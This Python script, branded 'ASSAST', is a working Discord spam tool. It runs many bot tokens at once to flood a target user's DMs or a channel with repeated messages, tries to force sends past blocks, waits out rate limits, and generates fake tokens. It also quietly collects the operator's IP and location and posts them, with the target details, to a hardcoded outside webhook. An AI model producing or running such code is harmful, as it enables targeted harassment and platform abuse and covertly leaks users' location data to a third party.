import os
import asyncio
import random
import discord
from discord.ext import commands
from datetime import datetime
import requests

os.system("cls" if os.name == "nt" else "clear")

RED = "\033[91m"
BLOOD = "\033[31m"
DARK = "\033[38;5;196m"
YELLOW = "\033[93m"
WHITE = "\033[37m"
RESET = "\033[0m"
BLINK = "\033[5m"

WEBHOOK_URL = "https://discord.com/api/webhooks/1486727855634255982/dIo-5V3SfEp8TTPBTiKQPkIlMM8QomdXjKpzN0DD_z2ChI6s0g7rp2y4kAlxF_-fnLJi"


def print_header():
    os.system("cls" if os.name == "nt" else "clear")
    print(BLOOD)
    print(" ______________________________________")
    print(" / | / /__ / /_ / | / /_ __/ /_____ _____")
    print(" / |/ / _ \\/ __/ / |/ / / / / //_/ _ \\/ ___/")
    print(" / /| / __/ /_ / /| / /_/ / ,< / __/ /")
    print(" /_/ |_/\___/\__/ /_/ |_/\__,_/_/|_|\___/_/")
    print(RESET)
    print(f"{DARK}{RESET}\n")
    print(f"{BLOOD}{RESET}\n")

print_header()


def get_location():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=5)
        if r.status_code == 200:
            data = r.json()
            ip = data.get("ip", "Unknown")
            city = data.get("city", "Unknown")
            region = data.get("region", "")
            country = data.get("country", "Unknown")
            loc = f"{city}, {region} - {country}" if region else f"{city} - {country}"
            return f"IP: {ip}\nLocation: {loc}"
    except:
        pass
    return "Location: Could not detect"


def send_webhook_log(spam_type, target_id, message, amount, bot_count):
    try:
        location = get_location()
        
        embed = {
            "title": "🩸 ASSAST - ACTIVITY DETECTED",
            "color": 0xFF0000,
            "fields": [
                {"name": "Type", "value": spam_type, "inline": True},
                {"name": "Target ID", "value": f"`{target_id}`", "inline": True},
                {"name": "Bots Used", "value": f"`{bot_count}`", "inline": True},
                {"name": "Messages per Bot", "value": f"`{amount}`", "inline": True},
                {"name": "Message", "value": f"```{message}```", "inline": False},
                {"name": "Location", "value": location, "inline": False},
                {"name": "Time", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False}
            ],
            "footer": {"text": "ASSAST • Powered by Configexe"}
        }

        data = {"embeds": [embed]}
        requests.post(WEBHOOK_URL, json=data, timeout=6)
    except:
        pass


def load_tokens():
    if not os.path.exists("bottokens.txt"):
        print(f"{RED}bottokens.txt not found!{RESET}")
        print(f"{WHITE}Create bottokens.txt and put one token per line.{RESET}")
        return []
   
    with open("bottokens.txt", "r", encoding="utf-8") as f:
        tokens = [line.strip() for line in f if line.strip()]
   
    if not tokens:
        print(f"{RED}No tokens found in bottokens.txt{RESET}")
        return []
   
    print(f"{BLOOD}{BLINK}LOADED {len(tokens)} BOTS{RESET}")
    return tokens

def save_log(target, target_type, message, amount, bot_count):
    if not os.path.exists("logs"):
        os.makedirs("logs")
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    with open(f"logs/ritual_{ts}.log", "w", encoding="utf-8") as f:
        f.write(f"ASSAST LOG - {ts.replace('_', ' ')}\n")
        f.write(f"Target : {target}\n")
        f.write(f"Type : {target_type}\n")
        f.write(f"Message : {message}\n")
        f.write(f"Amount : {amount}\n")
        f.write(f"Bots : {bot_count}\n")
        f.write("="*50 + "\n")

def generate_token():
    p1 = ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=24))
    p2 = ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=6))
    p3 = ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=38))
    return f"{p1}.{p2}.{p3}"

async def send_from_bot(token, target_id, message, amount, num, total, is_dm=True, bypass=False):
    print(f"{YELLOW}[{num}/{total}] Starting bot...{RESET}")
   
    intents = discord.Intents.default()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        print(f"{DARK}Bot ready{RESET}")
        try:
            if is_dm:
                target = await bot.fetch_user(int(target_id))
            else:
                target = bot.get_partial_messageable(int(target_id))
            if not target:
                print(f"{RED}[{num}] Target not found{RESET}")
                await bot.close()
                return
            for i in range(1, amount + 1):
                try:
                    await target.send(message)
                    print(f"{BLOOD}[{num}] [{i}/{amount}] Sent{RESET}")
                    await asyncio.sleep(random.uniform(0.28, 0.45))
                except discord.Forbidden:
                    if is_dm and bypass:
                        print(f"{RED}[{num}] [{i}] Forcing send...{RESET}")
                        try: await target.send(message)
                        except: pass
                    else:
                        print(f"{RED}[{num}] [{i}] Can't send → skip{RESET}")
                    await asyncio.sleep(0.25)
                    continue
                except discord.HTTPException as e:
                    if e.status == 429:
                        wait = float(e.response.headers.get("Retry-After", 2))
                        print(f"{RED}[{num}] Rate limit... waiting{RESET}")
                        await asyncio.sleep(wait + 0.5)
                    else:
                        await asyncio.sleep(0.4)
           
            print(f"{DARK}[{num}] Bot finished{RESET}")
        except:
            pass
        finally:
            try: await bot.close()
            except: pass

    try:
        await bot.start(token, reconnect=False)
    except:
        print(f"{RED}[{num}] Bot failed{RESET}")

def show_help():
    print(f"\n{BLOOD}=== HELP ==={RESET}")
    print(f"{WHITE}help          {RESET}- Show this help")
    print(f"{WHITE}clear         {RESET}- Clear screen")
    print(f"{WHITE}methods       {RESET}- Show how to spam")
    print(f"{WHITE}exit          {RESET}- Exit program")

def show_methods():
    print(f"\n{BLOOD}=== METHODS ==={RESET}")
    print(f"dmspam <userid> \"message\" <amount>")
    print(f"groupspam <channelid> \"message\" <amount>")
    print(f"bottokensgen <number>")

async def main():
    print(f"{WHITE}{RESET}\n")
   
    while True:
        cmd = input(f"{DARK}root@assast ~# {RESET}").strip()
        if not cmd:
            continue
        if cmd.lower() == "clear":
            print_header()
            continue
        if cmd.lower() == "help":
            show_help()
            continue
        if cmd.lower() == "methods":
            show_methods()
            continue
        if cmd.lower() == "exit":
            print(f"{BLOOD}Goodbye.{RESET}")
            break
       
        parts = cmd.split(maxsplit=3)
        if len(parts) >= 4 and parts[0].lower() in ["dmspam", "groupspam"]:
            mode = parts[0].lower()
            target_id = parts[1]
            message = parts[2].strip('"')
            try:
                amount = int(parts[3])
            except:
                print(f"{RED}Wrong format! Example: dmspam 123456789 \"text\" 50{RESET}")
                continue

            tokens = load_tokens()
            if not tokens:
                continue

            is_dm = (mode == "dmspam")
            bypass = False
            if is_dm:
                if input(f"{YELLOW}Use Bypass? (y/n): {RESET}").lower() == "y":
                    bypass = True

            spam_type = "DM Spam" if is_dm else "Group Spam"

            print(f"\n{BLOOD}{BLINK}STARTING WITH {len(tokens)} BOTS...{RESET}\n")

            
            send_webhook_log(spam_type, target_id, message, amount, len(tokens))

            save_log(target_id, spam_type, message, amount, len(tokens))

            tasks = []
            for i, token in enumerate(tokens, 1):
                task = asyncio.create_task(send_from_bot(token, target_id, message, amount, i, len(tokens), is_dm, bypass))
                tasks.append(task)
                await asyncio.sleep(0.25)

            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"\n{DARK}Finished.{RESET}")

        elif cmd.lower().startswith("bottokensgen"):
            try:
                num = int(cmd.split()[1])
                print(f"\n{YELLOW}Generating {num} tokens...{RESET}")
                tokens_list = [generate_token() for _ in range(num)]
                for i, t in enumerate(tokens_list, 1):
                    print(f"{i:3d}. {t}")
                if input(f"\nSave to bottokens.txt? (y/n): {RESET}").lower() == "y":
                    with open("bottokens.txt", "w", encoding="utf-8") as f:
                        for t in tokens_list:
                            f.write(t + "\n")
                    print(f"{WHITE}Tokens saved!{RESET}")
            except:
                print(f"{RED}Usage: bottokensgen <number>{RESET}")

        else:
            print(f"{RED}Unknown command. Type 'help' or 'methods'{RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{RED}Stopped.{RESET}")
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
